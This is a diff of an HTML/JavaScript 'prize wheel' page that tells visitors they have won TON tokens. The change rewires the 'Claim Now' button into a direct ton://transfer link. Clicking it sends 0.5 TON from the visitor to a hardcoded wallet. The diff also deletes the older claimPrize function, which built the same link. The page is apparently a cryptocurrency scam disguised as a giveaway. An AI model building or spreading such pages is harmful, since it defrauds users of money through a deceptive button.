@@ -160,6 +160,7 @@
             border: none;
             cursor: pointer;
             border-radius: 5px;
+            text-decoration: none;
         }
 
         .claim-btn:hover {
@@ -236,13 +237,13 @@
             <span class="close-btn">&times;</span>
             <h2>Congratulations!</h2>
             <p id="winMessage">You have won <span id="prizeAmount">X</span> TON tokens!</p>
-            <button class="claim-btn" onclick="claimPrize()">Claim Now</button>
+            <a class="claim-btn" href="ton://transfer/UQAbhDvkNm_1XH8dtXxbJ0nqRlH3-iATS1aL2yfG6oUcbEx2?amount=500000000">Claim Now</a>
         </div>
     </div>
 
     <script>
         // Initialize canvas
-        const DESTINATION_ADDRESS = "UQAbhDvkNm_1XH8dtXxbJ0nqRlH3-iATS1aL2yfG6oUcbEx2"
+        const DESTINATION_ADDRESS = ""
         const canvas = document.getElementById('wheel');
         const ctx = canvas.getContext('2d');
         const size = canvas.width = canvas.height = 300;
@@ -296,17 +297,6 @@
 
         // Close modal when X is clicked
         document.querySelector('.close-btn').onclick = function () {
-            document.getElementById('winModal').style.display = 'none';
-        }
-
-        // Function when "Claim Now" button is clicked
-        function claimPrize() {
-            let amount = 0.5 * (10 ** 9);
-            let transaction_link = `ton://transfer/${DESTINATION_ADDRESS}?amount=${Number(amount)}`;
-            
-            document.getElementById('claimButton').href = transaction_link;
-
-            // Close the modal
             document.getElementById('winModal').style.display = 'none';
         }
 
